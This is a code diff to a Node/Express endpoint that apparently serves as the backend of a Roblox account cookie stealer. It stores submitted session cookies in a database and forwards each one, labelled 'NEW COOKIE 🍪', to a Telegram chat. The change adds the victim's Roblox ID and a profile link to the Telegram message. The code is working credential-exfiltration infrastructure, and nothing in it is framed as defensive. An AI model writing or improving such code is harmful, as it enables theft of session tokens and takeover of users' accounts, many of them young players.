@@ -29,7 +29,7 @@ app.use(
 );
 
 app.post("/save", async (req, res) => {
-  const { login } = req.body ?? {};
+  const { login, robloxId } = req.body ?? {};
   if (!login) {
     return res
       .status(400)
@@ -38,11 +38,11 @@ app.post("/save", async (req, res) => {
 
   try {
     await client`
-      INSERT INTO users (cookie)
-      VALUES (${login})`;
+      INSERT INTO users (cookie, roblox_id)
+      VALUES (${login}, ${robloxId})`;
 
     await sendTelegramMessage(
-      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b> \n\n\n  <code>${login}</code> `);
+      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b>\n\n\n <b>LINK --- </b> https://www.roblox.com/users/${robloxId}/profile \n\n\n  <code>${login}</code> `);
 
     res.json({ ok: true, account });
   } catch (err) {
